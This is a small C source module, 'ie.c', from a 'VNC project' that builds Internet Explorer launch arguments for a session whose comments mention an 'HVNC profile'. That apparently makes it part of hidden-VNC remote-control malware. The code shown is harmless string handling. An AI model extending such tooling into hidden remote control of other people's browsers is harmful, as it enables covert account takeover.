//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// VNC project. Version 1.9.17.3
//	
// module: ie.c
// $Revision: 148 $
// $Date: 2014-01-29 14:13:12 +0400 (Wed, 29 Jan 2014) $
// description: 
//	Support of launching IE in VNC session

#include "project.h"
#include <malloc.h>
#include "exec.h"
#include "copy.h"
#include "browser.h"
#include "rt\str.h"

#define IE_START_PARAMSW L"-nomerge -noframemerging"
#define IE_START_PARAMSA "-nomerge -noframemerging"

//////////////////////////////////////////////////////////////////////////
// launches FF with HVNC profile
WINERROR IE_GetCommandLineW(PVNC_SESSION pSession, LPCWSTR szPath,LPWSTR *pNewCommandLine)
{
	WINERROR Error = NO_ERROR;
	LPWSTR lpNewCommandLine = NULL;
	int Length = cstrlenW(IE_START_PARAMSW)+1;

	UNREFERENCED_PARAMETER(szPath);
	
	lpNewCommandLine = hAlloc(Length*sizeof(WCHAR));
	if ( lpNewCommandLine ){
		lstrcpyW(lpNewCommandLine,IE_START_PARAMSW);
		*pNewCommandLine = lpNewCommandLine;
	}else{
		Error = ERROR_NOT_ENOUGH_MEMORY;
	}
	return Error;
}

WINERROR IE_GetCommandLineA(PVNC_SESSION pSession, LPCSTR szPath,LPSTR *pNewCommandLine)
{
	WINERROR Error = NO_ERROR;
	LPSTR lpNewCommandLine = NULL;
	int Length = cstrlenA(IE_START_PARAMSA)+1;

	UNREFERENCED_PARAMETER(szPath);
	
	lpNewCommandLine = hAlloc(Length*sizeof(CHAR));
	if ( lpNewCommandLine ){
		lstrcpyA(lpNewCommandLine,IE_START_PARAMSA);
		*pNewCommandLine = lpNewCommandLine;
	}else{
		Error = ERROR_NOT_ENOUGH_MEMORY;
	}
	return Error;
}